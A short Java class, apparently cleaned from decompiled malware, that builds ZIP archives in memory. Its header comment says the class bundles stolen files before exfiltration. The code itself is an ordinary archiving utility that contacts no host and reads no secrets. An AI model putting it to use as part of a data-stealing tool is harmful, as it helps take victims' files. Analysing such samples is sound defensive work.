import java.io.ByteArrayOutputStream;
import java.io.Closeable;
import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

/**
 * Cleaned MemoryZipEngine (formerly e.java)
 * Handles in-memory ZIP creation for bundling stolen files before exfiltration.
 */
public class MemoryZipEngine implements Closeable {
    private final ByteArrayOutputStream baos = new ByteArrayOutputStream();
    private final ZipOutputStream zos = new ZipOutputStream(baos);

    /**
     * Adds a text entry to the ZIP.
     */
    public synchronized void addTextEntry(String name, String content) {
        if (content != null && !content.isEmpty()) {
            addFileEntry(name, content.getBytes(StandardCharsets.UTF_8));
        }
    }

    /**
     * Adds a binary file entry to the ZIP.
     */
    public synchronized void addFileEntry(String name, byte[] data) {
        if (data == null || data.length == 0) return;
        try {
            zos.putNextEntry(new ZipEntry(name));
            zos.write(data);
            zos.closeEntry();
        } catch (IOException ignored) {}
    }

    /**
     * Finishes the ZIP and returns the byte array.
     */
    public byte[] getZipBytes() {
        try {
            zos.finish();
        } catch (IOException ignored) {}
        return baos.toByteArray();
    }

    @Override
    public void close() throws IOException {
        zos.close();
    }
}
